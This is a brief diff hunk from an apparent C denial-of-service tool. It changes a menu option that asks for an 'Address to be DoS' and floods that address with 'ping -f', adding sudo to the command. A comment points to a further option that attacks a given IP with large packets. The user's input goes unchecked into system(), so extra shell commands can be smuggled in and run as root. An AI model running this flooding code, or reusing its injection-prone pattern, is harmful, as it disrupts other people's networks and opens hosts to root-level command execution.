@@ -55,7 +55,7 @@ int main()
         char pingAdr[100], pingCmd[100];
         printf("Enter Address to be DoS: ");
         scanf("%s", pingAdr);
-        sprintf(pingCmd, "ping -f %s", pingAdr);
+        sprintf(pingCmd, "sudo ping -f %s", pingAdr);
         system(pingCmd);
     }
     else if (selection1 == 3) //Attack given IP with 1000 data bytes
